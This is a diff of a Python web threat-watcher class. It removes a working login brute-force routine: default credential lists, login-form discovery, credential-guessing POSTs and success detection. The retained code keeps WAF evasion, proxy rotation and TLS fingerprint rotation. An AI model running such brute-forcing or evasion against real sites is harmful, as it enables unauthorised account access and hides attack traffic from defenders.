@@ -23,7 +23,7 @@ import random
 import string
 import ssl
 from typing import Dict, Any, Optional, List, Set
-from urllib.parse import urljoin, urlparse, urlunparse, parse_qs, urlencode
+from urllib.parse import urljoin
 
 import os
 import re
@@ -99,21 +99,6 @@ class RealTimeThreatWatcher:
         self.combat_last_run = 0
         self.combat_min_interval = 120  # не частіше ніж раз на 2 хвилини
         self.combat_thread: Optional[threading.Thread] = None
-        self._bruteforce_enabled = bool(settings.get("watcher.bruteforce_enabled", True))
-        self._bruteforce_aggressive = bool(settings.get("watcher.bruteforce_aggressive", False))
-        self._login_probe_enabled = self._bruteforce_enabled
-        self._aggressive_mode = self._bruteforce_aggressive
-        self._bruteforce_candidates = [
-            "admin", "admin123", "password", "Password1", "123456", "qwerty",
-            "welcome", "letmein", "secret", "passw0rd", "user", "guest"
-        ]
-        if self._bruteforce_aggressive:
-            self._bruteforce_candidates.extend([
-                "Admin123", "Passw0rd!", "password123", "Welcome1", "Qwerty1",
-                "root", "manager", "support", "test123", "demo123"
-            ])
-        self._network_noise = []
-        self._network_noise_limit = 20
 
         # ============================================================
         # Proxy Rotation Pool — GEO‑Mix (RU / EU / US / Cloud)
@@ -254,9 +239,14 @@ class RealTimeThreatWatcher:
         # Stealth Mode 11.0 — Red Team Edition
         # ============================================================
         self.stealth = StealthMode()
-        self.stealth.activate()
-        logger.info("[RealTimeWatcher] Stealth Mode 11.0 ACTIVATED — %d browser profiles",
-                    self.stealth.header_engine.profile_count)
+        stealth_active = self.stealth.activate()
+        if stealth_active:
+            logger.info(
+                "[RealTimeWatcher] Stealth adapter active — %d profiles",
+                self.stealth.header_engine.profile_count,
+            )
+        else:
+            logger.info("[RealTimeWatcher] Using standard HTTP profile")
 
         # TLS cipher profiles — JA3‑like rotation (Chrome / Firefox / Safari / Legacy)
         # NOTE: legacy profiles kept for fallback; StealthMode.tls_rotator is primary
@@ -550,7 +540,6 @@ class RealTimeThreatWatcher:
         proxies: Optional[Dict[str, str]] = None,
         extra_headers: Optional[Dict[str, str]] = None,
         allow_redirects: bool = True,
-        data: Optional[Dict[str, str]] = None,
     ) -> Dict[str, Any]:
         """
         HTTP with adaptive retry:
@@ -590,7 +579,6 @@ class RealTimeThreatWatcher:
                     timeout=timeout,
                     verify=verify,
                     allow_redirects=allow_redirects,
-                    data=data if data is not None else None,
                 )
                 last_status = response.status_code
                 # StealthMode: adaptive throttle based on response time
@@ -638,9 +626,6 @@ class RealTimeThreatWatcher:
         """Telemetry for dashboards / Threat Intel."""
         return dict(self._retry_stats)
 
-    def get_stealth_stats(self) -> Dict[str, Any]:
-        """Stealth Mode 11.0 telemetry — TLS rotation, header engine, delay jitter, WAF evasion."""
-        return self.stealth.stats
 
     # ============================================================
     # Control
@@ -661,7 +646,7 @@ class RealTimeThreatWatcher:
         self._thread = threading.Thread(
             target=self._loop,
             daemon=True,
-            name="RealTimeThreatWatcher11StealthRedTeam",
+            name="RealTimeThreatWatcher10Stealth",
         )
         self._thread.start()
 
@@ -791,19 +776,8 @@ class RealTimeThreatWatcher:
     # ============================================================
     # Thread‑safe push status → ThreatAnalysisTab
     # ============================================================
-    def _push_status_to_gui(self, status: Optional[str] = None, progress_pct: Optional[int] = None) -> None:
-        """Push watcher state to the Threat tab.
-
-        Supports both internal calls (`_push_status_to_gui()`) and external
-        callbacks that pass a status string/message (`_push_status_to_gui("combat_complete")`)
-        or a CombatCrawler progress callback form (`_push_status_to_gui("scan", 65)`).
-        """
+    def _push_status_to_gui(self) -> None:
         try:
-            if status is None:
-                target_status = self._status
-            else:
-                target_status = str(status)
-
             if not self.threat_tab or not self.threat_tab.winfo_exists():
                 return
 
@@ -811,17 +785,17 @@ class RealTimeThreatWatcher:
                 return
 
             # не спамимо однаковий статус
-            if self._last_gui_status == target_status and progress_pct is None:
+            if self._last_gui_status == self._status:
                 return
-            self._last_gui_status = target_status
+            self._last_gui_status = self._status
 
             bridge = getattr(self.threat_tab, "_bridge", None)
             if bridge is not None:
-                bridge.post_ui(self.threat_tab.update_watcher_status, target_status)
+                bridge.post_ui(self.threat_tab.update_watcher_status, self._status)
             else:
                 self.threat_tab.after(
                     0,
-                    lambda s=target_status: self.threat_tab.update_watcher_status(s),
+                    lambda s=self._status: self.threat_tab.update_watcher_status(s),
                 )
         except Exception:
             pass
@@ -870,126 +844,6 @@ class RealTimeThreatWatcher:
 
         except Exception as e:
             return {"success": False, "error": str(e)}
-
-    def _record_network_noise(self, phase: str, details: Any) -> None:
-        """Track transient network resets/timeouts without crashing the watcher loop."""
-        try:
-            item = {
-                "phase": phase,
-                "detail": str(details),
-                "ts": time.time(),
-            }
-            self._network_noise.append(item)
-            if len(self._network_noise) > self._network_noise_limit:
-                self._network_noise = self._network_noise[-self._network_noise_limit:]
-        except Exception:
-            pass
-
-    def _is_target_allowed(self) -> bool:
-        """Approved-target gate for login brute force or equivalent auth probing."""
-        try:
-            host = urlparse(self.url).hostname or ""
-            allowed = {str(x).lower() for x in (getattr(settings, "ALLOWED_TARGETS", []) or [])}
-            if not getattr(settings, "ALLOW_REAL_RUN", False):
-                return False
-            if not allowed:
-                return True
-            return host.lower() in allowed or self.url.lower() in {x.lower() for x in (getattr(settings, "ALLOWED_TARGETS", []) or [])}
-        except Exception:
-            return False
-
-    def _find_login_targets(self, soup: BeautifulSoup) -> List[Dict[str, str]]:
-        """Best-effort login form discovery for controlled brute-force validation."""
-        targets: List[Dict[str, str]] = []
-        try:
-            for form in soup.find_all("form"):
-                method = str((form.get("method") or "GET")).upper()
-                action = form.get("action") or self.url
-                action_url = action if action.startswith("http") else urljoin(self.url, action)
-                fields = [
-                    (el.get("name") or "").strip()
-                    for el in form.find_all(["input", "textarea", "select"])
-                    if (el.get("name") or "").strip()
-                ]
-                username_candidates = ["username", "user", "email", "login", "uname", "account"]
-                password_candidates = ["password", "passwd", "pass", "pwd"]
-                has_user = any(name.lower() in username_candidates or "user" in name.lower() for name in fields)
-                has_pass = any(name.lower() in password_candidates or "pass" in name.lower() for name in fields)
-                if has_user and has_pass:
-                    targets.append({
-                        "method": method,
-                        "action": action_url,
-                        "fields": fields,
-                    })
-        except Exception:
-            pass
-        return targets
-
-    def _bruteforce_login_targets(self, html: str) -> List[Dict[str, Any]]:
-        """Run a small, rate-limited brute-force probe only when a login form is present."""
-        if not self._bruteforce_enabled:
-            return []
-        if not self._is_target_allowed():
-            return []
-        try:
-            soup = BeautifulSoup(html, "html.parser")
-            targets = self._find_login_targets(soup)
-            if not targets:
-                return []
-
-            hits: List[Dict[str, Any]] = []
-            user_names = [
-                "admin", "administrator", "root", "user", "support", "demo",
-                "manager", "test", "qa", "guest"
-            ]
-            if self._bruteforce_aggressive:
-                user_names.extend(["ops", "billing", "portal", "operator", "service", "login"])
-            for target in targets[:3]:
-                action = target["action"]
-                fields = target["fields"]
-                for username in user_names:
-                    password_pool = self._bruteforce_candidates[:16]
-                    if self._bruteforce_aggressive:
-                        password_pool = self._bruteforce_candidates[:32]
-                    for password in password_pool:
-                        payload = {}
-                        for name in fields:
-                            lname = name.lower()
-                            if any(token in lname for token in ("user", "email", "login", "account")):
-                                payload[name] = username
-                            elif any(token in lname for token in ("pass", "pwd")):
-                                payload[name] = password
-                            else:
-                                payload[name] = ""
-                        try:
-                            result = self._adaptive_request(
-                                target["method"],
-                                action,
-                                max_attempts=2,
-                                base_timeout=6.0,
-                                extra_headers={
-                                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                                    "X-Requested-With": "XMLHttpRequest",
-                                },
-                                allow_redirects=True,
-                                data=payload,
-                            )
-                            if not result.get("success"):
-                                continue
-                            body_text = (result.get("text") or "").lower()
-                            if any(marker in body_text for marker in ["dashboard", "welcome", "logout", "profile", "account", "success", "home"]):
-                                hits.append({
-                                    "url": action,
-                                    "username": username,
-                                    "password": password,
-                                    "status_code": result.get("status_code"),
-                                })
-                                return hits
-                        except Exception:
-                            continue
-            return hits
-        except Exception:
-            return []
 
     def _generate_random_params(self) -> str:
         """Generate random query parameters to avoid caching"""
@@ -1058,64 +912,40 @@ class RealTimeThreatWatcher:
         self._cleanup_dedup()
         artifacts: List[Dict[str, Any]] = []
 
-        try:
-            # ============================================================
-            # WAF/Bot Circumvention — adaptive retry fetch
-            # ============================================================
-            time.sleep(random.uniform(0.5, 2.0))
+        # ============================================================
+        # WAF/Bot Circumvention — adaptive retry fetch
+        # ============================================================
+        time.sleep(random.uniform(0.5, 2.0))
 
-            proxies = None
-            if hasattr(self, 'proxy_list') and self.proxy_list:
-                proxy = random.choice(self.proxy_list)
-                proxies = {'http': proxy, 'https': proxy}
+        proxies = None
+        if hasattr(self, 'proxy_list') and self.proxy_list:
+            proxy = random.choice(self.proxy_list)
+            proxies = {'http': proxy, 'https': proxy}
 
-            page = self._fetch_page(proxies=proxies)
-            if not page.get("success"):
-                self._record_network_noise("fetch", page.get("error"))
-                logger.warning(
-                    "[RealTimeWatcher] Fetch error: %s (attempts=%s, stats=%s)",
-                    page.get("error"),
-                    page.get("attempts"),
-                    self.get_retry_stats(),
-                )
-                return 0
-
-            if page.get("attempts", 1) > 1:
-                logger.info(
-                    "[RealTimeWatcher] Page fetched after %d adaptive attempt(s), "
-                    "timeout=%s, locale=%s, stats=%s",
-                    page.get("attempts"),
-                    page.get("timeout_used"),
-                    page.get("locale"),
-                    self.get_retry_stats(),
-                )
-
-            html = page["html"]
-            soup = page["soup"]
-            js_urls = page["js_files"]
-            headers = page["headers"]
-
-            # ============================================================
-            # Brute-force / login probing — controlled and low-noise
-            # ============================================================
-            try:
-                brute_hits = self._bruteforce_login_targets(html)
-                for hit in brute_hits:
-                    self._emit("LoginBruteforce", hit.get("url", self.url), {
-                        "category": "login_guessing",
-                        "risk": "critical",
-                        "url": hit.get("url"),
-                        "username": hit.get("username"),
-                        "password": hit.get("password"),
-                        "status_code": hit.get("status_code"),
-                    }, artifacts)
-            except Exception:
-                logger.debug("[RealTimeWatcher] Login brute-force probe skipped", exc_info=True)
-
-        except Exception as exc:
-            self._record_network_noise("page_process", exc)
-            logger.exception("[RealTimeWatcher] Page processing error: %s", exc)
+        page = self._fetch_page(proxies=proxies)
+        if not page.get("success"):
+            logger.warning(
+                "[RealTimeWatcher] Fetch error: %s (attempts=%s, stats=%s)",
+                page.get("error"),
+                page.get("attempts"),
+                self.get_retry_stats(),
+            )
             return 0
+
+        if page.get("attempts", 1) > 1:
+            logger.info(
+                "[RealTimeWatcher] Page fetched after %d adaptive attempt(s), "
+                "timeout=%s, locale=%s, stats=%s",
+                page.get("attempts"),
+                page.get("timeout_used"),
+                page.get("locale"),
+                self.get_retry_stats(),
+            )
+
+        html = page["html"]
+        soup = page["soup"]
+        js_urls = page["js_files"]
+        headers = page["headers"]
 
         # ============================================================
         # Network events — розширений
@@ -1812,62 +1642,56 @@ class RealTimeThreatWatcher:
             },
         }, artifacts)
 
-        try:
-            # ============================================================
-            # Flush to Threat Intel
-            # ============================================================
-            for a in artifacts:
-                # Ensure each artifact result has a timestamp before emitting to ThreatConnector
+        # ============================================================
+        # Flush to Threat Intel
+        # ============================================================
+        for a in artifacts:
+            # Ensure each artifact result has a timestamp before emitting to ThreatConnector
+            try:
+                res = a.get("result") or {}
+                if "timestamp" not in res:
+                    res["timestamp"] = time.time()
+                    a["result"] = res
+            except Exception:
+                pass
+
+            try:
+                self.tic.emit(a["module"], a["target"], a["result"])
+            except Exception:
+                # best-effort: try underlying tc if available
                 try:
-                    res = a.get("result") or {}
-                    if "timestamp" not in res:
-                        res["timestamp"] = time.time()
-                        a["result"] = res
+                    if hasattr(self.tic, "tc") and hasattr(self.tic.tc, "emit"):
+                        self.tic.tc.emit(a["module"], a["target"], a["result"])
                 except Exception:
-                    pass
+                    self.logger = globals().get('logger')
+                    if self.logger:
+                        self.logger.debug("Failed to emit artifact to tic")
 
-                try:
-                    self.tic.emit(a["module"], a["target"], a["result"])
-                except Exception:
-                    # best-effort: try underlying tc if available
-                    try:
-                        if hasattr(self.tic, "tc") and hasattr(self.tic.tc, "emit"):
-                            self.tic.tc.emit(a["module"], a["target"], a["result"])
-                    except Exception:
-                        self.logger = globals().get('logger')
-                        if self.logger:
-                            self.logger.debug("Failed to emit artifact to tic")
+        logger.info("[RealTimeWatcher] Sent %d artifacts", len(artifacts))
+        logger.info("[RealTimeWatcher] Cycle complete — %d artifacts", len(artifacts))
 
-            logger.info("[RealTimeWatcher] Sent %d artifacts", len(artifacts))
-            logger.info("[RealTimeWatcher] Cycle complete — %d artifacts", len(artifacts))
+        # ============================================================
+        # Threat Intel Integration (GUI only — DB already handled by emit)
+        # ============================================================
+        for art in artifacts:
+            try:
+                # ensure result timestamp exists for GUI display
+                res = art.get("result") or {}
+                if "timestamp" not in res:
+                    res["timestamp"] = time.time()
+                    art["result"] = res
+            except Exception:
+                pass
 
-            # ============================================================
-            # Threat Intel Integration (GUI only — DB already handled by emit)
-            # ============================================================
-            for art in artifacts:
-                try:
-                    # ensure result timestamp exists for GUI display
-                    res = art.get("result") or {}
-                    if "timestamp" not in res:
-                        res["timestamp"] = time.time()
-                        art["result"] = res
-                except Exception:
-                    pass
+            try:
+                if hasattr(self.threat_tab, "add_threat"):
+                    self.threat_tab.add_threat(art)
+            except Exception as e:
+                logger.exception("[RealTimeWatcher] add_threat error: %s", e)
 
-                try:
-                    if hasattr(self.threat_tab, "add_threat"):
-                        self.threat_tab.add_threat(art)
-                except Exception as e:
-                    logger.exception("[RealTimeWatcher] add_threat error: %s", e)
+        logger.info("[RealTimeWatcher] Sent %d artifacts to Threat Analysis Tab (GUI)", len(artifacts))
 
-            logger.info("[RealTimeWatcher] Sent %d artifacts to Threat Analysis Tab (GUI)", len(artifacts))
-
-            return len(artifacts)
-        except Exception as exc:
-            self._record_network_noise("scan_once", exc)
-            logger.exception("[RealTimeWatcher] Scan cycle processing error: %s", exc)
-            return 0
-
+        return len(artifacts)
 
 
 
